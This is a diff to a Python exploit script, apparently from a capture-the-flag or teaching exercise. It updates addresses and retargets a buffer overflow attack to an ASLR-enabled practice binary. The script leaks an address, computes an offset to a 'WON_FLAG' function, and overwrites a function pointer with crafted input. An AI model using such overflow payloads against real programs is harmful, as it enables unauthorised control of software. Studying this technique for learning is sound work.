@@ -4,11 +4,11 @@ from struct import pack, unpack
 BUFFER_SIZE = 32
 ADDRESS_OFFSET = 49
 CHARS_TO_RET = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII'
-WON_FLAG_ADDR = 0x00401533
-ADD_ADDR = 0x00401551
+WON_FLAG_ADDR = 0x004011a0
+ADD_ADDR = 0x00401190
 OFFSET = WON_FLAG_ADDR - ADD_ADDR
 
-p = Popen(['calculator.exe'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)
+p = Popen(['calculator-aslr.exe'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)
 
 def read():
     return p.stdout.readline()
@@ -35,7 +35,7 @@ print("Address of WON_FLAG:", ' '.join(hex(n) for n in addr_win[::-1]))
 print("Overflowing to get function pointer to WON_FLAG")
 write(CHARS_TO_RET + addr_win + b'\n')
 
-read(); read();
+read(); read()
 print(read())
 
 p.kill()
